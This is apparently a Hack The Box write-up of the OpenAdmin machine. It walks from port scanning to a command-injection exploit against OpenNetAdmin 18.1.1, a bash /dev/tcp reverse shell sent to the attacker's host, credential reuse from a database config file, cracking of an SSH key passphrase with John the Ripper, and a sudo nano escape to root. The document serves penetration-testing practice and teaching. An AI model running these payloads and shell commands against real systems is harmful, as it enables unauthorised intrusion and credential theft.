## Default Information
IP Address: 10.10.10.171\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.171    openadmin.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.171 --rate=1000 -e tun0
[sudo] password for kali: 
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-10-31 02:16:56 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.171                                    
Discovered open port 80/tcp on 10.10.10.171   
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22	| ssh | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | Open |
| 80	| http | Apache httpd 2.4.29 ((Ubuntu)) | Open |

Afterwwards, we will use Nmap to scan for potential vulnerabilties on each of the ports

```
{Nmap output}
```

### Gobuster
We will then use Gobuster to find the endpoints that are accessible from http://openadmin.htb

```
http://10.10.10.171:80/.htpasswd            (Status: 403) [Size: 277]
http://10.10.10.171:80/.htpasswd.txt        (Status: 403) [Size: 277]
http://10.10.10.171:80/.htpasswd.html       (Status: 403) [Size: 277]
http://10.10.10.171:80/.htpasswd.php        (Status: 403) [Size: 277]
http://10.10.10.171:80/.htpasswd.asp        (Status: 403) [Size: 277]
http://10.10.10.171:80/.hta.html            (Status: 403) [Size: 277]
http://10.10.10.171:80/.htaccess.php        (Status: 403) [Size: 277]
http://10.10.10.171:80/.htpasswd.aspx       (Status: 403) [Size: 277]
http://10.10.10.171:80/.hta.php             (Status: 403) [Size: 277]
http://10.10.10.171:80/.htaccess            (Status: 403) [Size: 277]
http://10.10.10.171:80/.htpasswd.jsp        (Status: 403) [Size: 277]
http://10.10.10.171:80/.hta.asp             (Status: 403) [Size: 277]
http://10.10.10.171:80/.htaccess.asp        (Status: 403) [Size: 277]
http://10.10.10.171:80/.hta.aspx            (Status: 403) [Size: 277]
http://10.10.10.171:80/.htaccess.aspx       (Status: 403) [Size: 277]
http://10.10.10.171:80/.htaccess.jsp        (Status: 403) [Size: 277]
http://10.10.10.171:80/.hta                 (Status: 403) [Size: 277]
http://10.10.10.171:80/.htaccess.txt        (Status: 403) [Size: 277]
http://10.10.10.171:80/.hta.jsp             (Status: 403) [Size: 277]
http://10.10.10.171:80/.htaccess.html       (Status: 403) [Size: 277]
http://10.10.10.171:80/.hta.txt             (Status: 403) [Size: 277]
http://10.10.10.171:80/artwork              (Status: 301) [Size: 314] [--> http://10.10.10.171/artwork/]
http://10.10.10.171:80/index.html           (Status: 200) [Size: 10918]
http://10.10.10.171:80/sierra               (Status: 301) [Size: 313] [--> http://10.10.10.171/sierra/]
http://10.10.10.171:80/music                (Status: 301) [Size: 312] [--> http://10.10.10.171/music/]
http://10.10.10.171:80/server-status        (Status: 403) [Size: 277]
```

### Web-content discovery

Viewing all the sites, there was not much discovery until we visit http://openadmin.htb/admin. Viewing the page source of the website, we notice a strange ```href``` tag 
that points to ../ona

![ona href link](https://github.com/joelczk/writeups/blob/main/HTB/Images/OpenAdmin/href_ona.png)

Following that link, we are redirected to http;//openadmin.htb/ona which is OpenNetAdmin. From there, we are also able to find the current version of OpenNetAdmin that we are 
using

![ona site](https://github.com/joelczk/writeups/blob/main/HTB/Images/OpenAdmin/ona.png)

## Exploit

### Remote Code Execution on OpenNetAdmin
Using searchsploit, we can find that OpenNetAdmin 18.1.1 is vulnerable to a remote code execution

```
┌──(kali㉿kali)-[~]
└─$ searchsploit opennetadmin 18.1.1
------------------------------------------------------------ ---------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------ ---------------------------------
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                 | php/webapps/47691.sh
------------------------------------------------------------ ---------------------------------
```

Exploiting this vulnerability, we are able to execute a ```id``` command from the server of OpenNetAdmin

```
┌──(kali㉿kali)-[~]
└─$ curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";id;echo \"END\"&xajaxargs[]=ping" "http://openadmin.htb/ona/" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Obtaining reverse shell

Now, we would have to execute a reverse shell command using the ```curl``` command mentioned above.

```
┌──(kali㉿kali)-[~]
└─$ curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.7%2F3000%200%3E%261%27;echo \"END\"&xajaxargs[]=ping" "http://openadmin.htb/ona/" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
```

Next, all that we have to do is to stabilize the reverse shell

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 3000
listening on [any] 3000 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.171] 45470
bash: cannot set terminal process group (1245): Inappropriate ioctl for device
bash: no job control in this shell
www-data@openadmin:/opt/ona/www$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<ww$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@openadmin:/opt/ona/www$ export TERM=xterm
export TERM=xterm
www-data@openadmin:/opt/ona/www$ stty cols 132 rows 34
stty cols 132 rows 34
www-data@openadmin:/opt/ona/www$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@openadmin:/opt/ona/www$ 
```

We realize that there are 2 users on this machine, namely Jimmy and Joanna. However, we do not have the permissions to view the files owned by the 2 users.

```
www-data@openadmin:/home$ ls -la
ls -la
total 16
drwxr-xr-x  4 root   root   4096 Nov 22  2019 .
drwxr-xr-x 24 root   root   4096 Aug 17 13:12 ..
drwxr-x---  5 jimmy  jimmy  4096 Nov 22  2019 jimmy
drwxr-x---  5 joanna joanna 4096 Jul 27 06:12 joanna
```

### Privilege Escalation to Jimmy

We are able to find a database configuration file at /opt/ona/www/local/config/database_settings.inc.php, which shows the database credentials

```
www-data@openadmin:/opt/ona/www/local/config$ cat database_settings.inc.php
cat database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

?>www-data@openadmin:/opt/ona/www/local/config$
```

We will try this password to login to the user ```jimmy```, which we managed to do it successfully

```
www-data@openadmin:/opt/ona/www/local/config$ su jimmy     
su jimmy
Password: n1nj4W4rri0R!

jimmy@openadmin:/opt/ona/www/local/config$
```

However, we are still unable to find the user flag. We would probably need to privilege escalate to Joanna to be able to obtain the user flag

```
jimmy@openadmin:~$ cd /home/jimmy
cd /home/jimmy
jimmy@openadmin:~$ ls -la
ls -la
total 32
drwxr-x--- 5 jimmy jimmy 4096 Nov 22  2019 .
drwxr-xr-x 4 root  root  4096 Nov 22  2019 ..
lrwxrwxrwx 1 jimmy jimmy    9 Nov 21  2019 .bash_history -> /dev/null
-rw-r--r-- 1 jimmy jimmy  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 jimmy jimmy 3771 Apr  4  2018 .bashrc
drwx------ 2 jimmy jimmy 4096 Nov 21  2019 .cache
drwx------ 3 jimmy jimmy 4096 Nov 21  2019 .gnupg
drwxrwxr-x 3 jimmy jimmy 4096 Nov 22  2019 .local
-rw-r--r-- 1 jimmy jimmy  807 Apr  4  2018 .profile
jimmy@openadmin:~$
```

### Privilege Escalation to joanna

We realize now that we have the permissions to access the files inside /var/www/internal. In the directory of /var/www/html, we discover a main.php file that executes ```cat /home/joanna/.ssh/id_rsa```, which means that the main.php file will expose the joanna's id_rsa keyfile. 

```
jimmy@openadmin:/var/www/internal$ cat main.php
cat main.php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

Knowing that, we try to curl using /internl/main.php and /main.php, but we get back a status code 404, which means that the target site that we are trying to reach is likely to only be accesible on the localhost, or to some ports unknown to us.

```
┌──(kali㉿kali)-[~]
└─$ curl http://openadmin.htb/internal/main.php
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at openadmin.htb Port 80</address>
</body></html>
                                                                                             
┌──(kali㉿kali)-[~]
└─$ curl http://openadmin.htb/main.php  
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at openadmin.htb Port 80</address>
</body></html>
                                                                                             
┌──(kali㉿kali)-[~]
└─$
```

Using LinEnum, we are able to identify a suspicious port 52846 that is up on the localhost.

```
[-] Listening TCP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -            
```
Using the curl command, we are able to obtain encrypted id_rsa keyfile. 

```
jimmy@openadmin:/var/www/internal$ curl http://localhost:52846/main.php
curl http://localhost:52846/main.php
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
jimmy@openadmin:/var/www/internal$ 
```

Now, we have to copy Joanna's id_rsa keyfile to our local machine. With joanna's encrypted id_rsa file, we will need to decrpyt the keyfile using John The Ripper.

```
┌──(HTB)─(kali㉿kali)-[~/Desktop]
└─$ python ssh2john.py joanna_rsa > joanna.hash                                          1 ⚙
                                                                                             
┌──(HTB)─(kali㉿kali)-[~/Desktop]
└─$ john --wordlist=/home/kali/Desktop/pentest/wordlist/rockyou.txt joanna.hash          1 ⚙
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (joanna_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:02 DONE (2021-11-02 12:29) 0.3891g/s 5580Kp/s 5580Kc/s 5580KC/sa6_123..*7¡Vamos!
Session completed
```

Now, all we have to do is to SSH using joanna's id_rsa keyfile

```
┌──(HTB)─(kali㉿kali)-[~/Desktop]
└─$ chmod 600 joanna_rsa                                                                 1 ⚙
                                                                                             
┌──(HTB)─(kali㉿kali)-[~/Desktop]
└─$ ssh -i joanna_rsa joanna@10.10.10.171                                                1 ⚙
Enter passphrase for key 'joanna_rsa': 
Last login: Tue Nov  2 16:33:28 2021 from 10.10.16.4
joanna@openadmin:~$ id
uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
joanna@openadmin:~$ 
```

### Obtaining user flag

```
joanna@openadmin:~$ cd /home/joanna
joanna@openadmin:~$ cat user.txt
<Redacted user flag>
joanna@openadmin:~$ 
```

### Privilege Escalation to root

Executing ```sudo -l```, we realize that joanna is able to execute /bin/nano /opt/priv with sudo privileges without any password.

```
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

Fromm GTFO bins, we can do a privilege escalation on /bin/nano using the following commands:

```
sudo /bin/nano /opt/priv
^R^X
reset; sh 1>&0 2>&0
```

![Privilege Escalation to root](https://github.com/joelczk/writeups/blob/main/HTB/Images/OpenAdmin/root.png)

### Obtaining root flag

```
root@openadmin:/home/joanna# cat /root/root.txt                                                           M-F New Buffer
<Redacted root flag>
root@openadmin:/home/joanna#
```
